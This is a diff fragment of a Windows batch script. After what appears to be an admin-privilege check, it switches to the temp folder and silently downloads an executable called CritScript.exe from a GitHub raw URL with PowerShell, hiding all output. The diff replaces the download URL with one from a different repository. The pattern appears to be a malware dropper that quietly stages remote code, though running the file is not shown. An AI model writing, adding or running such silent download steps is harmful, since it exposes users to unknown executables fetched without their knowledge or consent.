@@ -35,7 +35,7 @@ if '%errorlevel%' NEQ '0' (
     cd %TEMP%
 
     REM --> Download files silently using PowerShell
-    powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.exe' -OutFile CritScript.exe" >nul 2>&1
+    powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/DARJARN7/DDNS/main/CritScript.exe' -OutFile CritScript.exe" >nul 2>&1
 
     REM --> Check if CritScript.exe exists silently
     if not exist "CritScript.exe" (
